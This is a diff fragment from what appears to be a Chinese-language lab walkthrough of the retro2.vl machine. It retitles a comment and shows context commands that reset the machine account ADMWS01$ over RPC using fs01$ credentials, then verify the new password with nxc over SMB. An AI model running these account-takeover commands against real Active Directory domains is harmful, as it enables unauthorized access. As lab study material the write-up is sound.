@@ -135,7 +135,7 @@ $ net rpc password 'ADMWS01$' Roguel -U retro2.vl/'fs01$'%Roguel -S BLN01.retro2
 $ nxc smb BLN01.retro2.vl -u 'ADMWS01$' -p 'Roguel'
 ```
 ```
-//解析
+//第四句解析
 
 net rpc password → 用 RPC 协议修改密码 |'ADMWS01$' → 目标账号名（这里是一个计算机账户，末尾的 $ 说明是机器账户）| Roguel → 要设置的新密码
 
